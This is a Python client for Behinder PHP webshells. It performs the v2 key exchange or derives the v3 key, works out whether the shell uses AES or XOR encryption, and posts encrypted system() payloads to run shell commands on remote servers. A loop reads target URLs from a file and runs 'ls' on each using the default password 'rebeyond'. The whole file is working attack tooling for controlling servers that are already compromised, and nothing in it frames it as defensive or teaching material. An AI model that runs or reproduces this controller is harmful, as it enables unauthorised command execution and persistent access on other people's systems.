from Crypto.Cipher import AES
import base64
import requests
import random
import hashlib

class AES128Encryptor(object):
    def __init__(self, key):
        self._key = self._padding_zero(key)

    def encrypt(self, msg) -> str:
        enc = AES.new(self._key, AES.MODE_CBC, b'\x00' * 16)
        return base64.b64encode(enc.encrypt(self._padding_pkcs5(msg))).decode()

    def _padding_pkcs5(self, msg) -> bytes:
        if isinstance(msg, str):
            msg = msg.encode()

        if len(msg) == 0x10:
            return msg + b'\x10' * 0x10
        return msg + (
            0x10 - len(msg) % 0x10) * chr(0x10 - len(msg) % 0x10).encode()

    def _padding_zero(self, key) -> bytes:
        output = list(key)
        while len(output) % 16:
            output.append('\x00')

        return ''.join(output).encode()
    
    def decrypt(self,msg):
        enc = AES.new(self._key, AES.MODE_CBC, b'\x00' * 16)
        plain_text = enc.decrypt(self._padding_pkcs5(base64.b64decode(msg)))
        return plain_text

def _random_str(num=16):
    H = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    salt = ''
    for i in range(num):
        salt += random.choice(H)
    return salt

proxies = {
    # 'http' : "http://127.0.0.1:8080"
}

class WebShellConnector(object):
    TIMEOUT = 5

    def __init__(self, url, pwd, behinder_version=2,lang='php'):
        self._url = url
        self._lang = lang
        self._session = requests.Session()
        if behinder_version == 3:
            self._pwd = pwd
            self._behinder_key = hashlib.md5(self._pwd.encode()).hexdigest()[:16]
        elif behinder_version == 2:
            self._pwd = pwd
            self._behinder_key_exchange()
        self._aes_encryptor = AES128Encryptor(self._behinder_key)
        self._behinder_check_encrypt()

    def _behinder_key_exchange(self):
        self._session = requests.Session()
        r = self._session.get(self._url, params={self._pwd: '1'}, timeout=self.TIMEOUT,proxies=proxies)
        self._behinder_key = r.text[:16]

    def _behinder_check_encrypt(self):

        identity = _random_str()
        r = self._session.post(
            self._url,
            timeout=self.TIMEOUT,
            data=self._behinder_aes_encrypt(f'|print_r("{identity}");'),proxies=proxies)

        if identity in r.text:
            self._enc_way = 'aes'
        else:
            self._enc_way = 'xor'

    def _behinder_xor_encrypt(self, msg) -> str:
        output = []
        for i in range(0, len(msg)):
            output.append(
                chr(ord(msg[i]) ^ ord(self._behinder_key[((i + 1) & 15)])))

        return base64.b64encode(''.join(output).encode()).decode()

    def _behinder_aes_encrypt(self, msg) -> str:
        return self._aes_encryptor.encrypt(msg)

    def _exec_php(self, cmd) -> str:
        data = ('|@ini_set("display_errors","0");'
                '@set_time_limit(0);'
                f'system(\'{cmd}\');//')

        if self._enc_way == 'aes':
            data = self._behinder_aes_encrypt(data)
        elif self._enc_way == 'xor':
            data = self._behinder_xor_encrypt(data)
        else:
            pass
            # raise exceptions.BehinderWebshellKeyExchangeException
        try:
            r = self._session.post(
                self._url, data=data, timeout=self.TIMEOUT,proxies=proxies)
            return r.content.decode(errors='ignore')
        except (requests.exceptions.RequestException,
                requests.exceptions.ConnectionError):
                pass


def loop():
    with open("url.txt",'r') as f:
        for url in f.readlines():
            w = WebShellConnector(url.replace("\n",""),"rebeyond",2,'php')
            d = w._exec_php("ls")
            print(d)

if __name__ == "__main__":
    # url = "http://localhost/webshell/behind/shell.php"
    # password = "rebeyond"
    # webshell = WebShellConnector(url,password,3,'php')
    # d = webshell._exec_php("ls")
    # print(d)
    loop()